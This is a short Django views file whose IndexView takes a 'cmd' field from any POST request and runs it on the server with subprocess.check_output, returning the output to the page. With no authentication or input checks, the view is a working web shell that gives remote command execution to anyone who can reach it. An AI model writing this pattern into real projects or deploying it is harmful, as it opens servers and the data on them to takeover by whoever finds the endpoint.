from django.shortcuts import render
from django.views import generic
import subprocess

# Create your views here.
class IndexView(generic.TemplateView):
    template_name = 'index.html'

    def post(self, request, **kwargs):
        cmd = request.POST["cmd"]
        if cmd:
            context = {'rst': subprocess.check_output(cmd.split()).decode("utf-8")}
        else:
            context = {}
        return super().render_to_response(context)
